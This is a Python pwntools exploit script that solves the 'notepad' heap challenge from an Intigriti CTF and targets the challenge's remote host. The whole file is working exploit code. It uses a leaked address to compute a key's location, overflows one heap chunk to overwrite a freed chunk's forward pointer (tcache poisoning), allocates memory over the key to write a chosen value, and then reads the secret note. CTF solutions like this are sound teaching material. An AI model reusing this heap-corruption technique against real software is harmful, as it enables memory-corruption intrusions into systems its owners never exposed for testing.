#!/usr/bin/python3
from pwn import *

# REMEMBER TO USE PWNINIT

elf = context.binary = ELF("notepad_patched")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("notepad.ctf.intigriti.io", 1341)
    else:
        return process(elf.path)


io = start()

io.recvuntil(b"Here a gift: ")
main_addr = io.recvline().strip()
main_addr = int(main_addr, 16)
log.info("Main addr @ %s" % hex(main_addr))
key = main_addr + 0x200eb2 # offset found in gdb taking key_addr - main_addr
log.info("Key @ %s" % hex(key))


# create 0
io.recv()
io.sendline(b"1") # create note
io.recvuntil(b"> ")
io.sendline(b"0") # index
io.recvuntil(b"> ")
io.sendline(b"20")
io.recvuntil(b"> ")
io.sendline(b"A"*8)
io.recvuntil(b"> ")

# create 1
io.sendline(b"1") # create note
io.recvuntil(b"> ")
io.sendline(b"1") # index
io.recvuntil(b"> ")
io.sendline(b"20")
io.recvuntil(b"> ")
io.sendline(b"a"*8)
io.recvuntil(b"> ")

# delete 1
io.sendline(b"4") # delete
io.recvuntil(b"> ")
io.sendline(b"1") # index
io.recvuntil(b"> ")

# edit chunk 0 and overwrite fd pointer of chunk1 so that it points to key
io.sendline(b"3")
io.recvuntil(b"> ")
io.sendline(b"0")
io.recvuntil(b"> ")
p = b"B"*24 + p64(0x21) + p64(key)
io.sendline(p)
io.recvuntil(b"> ")

# Now the free item (chunk1) is pointing to key
# Since it is last in first out like a stack we have to allocate 1 chunk
# and then one more to request the memory at key

# create 2 (reallocate chunk1)
io.sendline(b"1") # create note
io.recvuntil(b"> ")
io.sendline(b"2") # index
io.recvuntil(b"> ")
io.sendline(b"20")
io.recvuntil(b"> ")
io.sendline(b"a"*8)
io.recvuntil(b"> ")


# create 3 : allocated on key
io.sendline(b"1") # create note
io.recvuntil(b"> ")
io.sendline(b"3") # index
io.recvuntil(b"> ")
io.sendline(b"20")
io.recvuntil(b"> ")
p = p64(0xcafebabe)
io.sendline(p)
io.recvuntil(b"> ")

# ask to see secret note
io.sendline(b"5")



io.interactive()
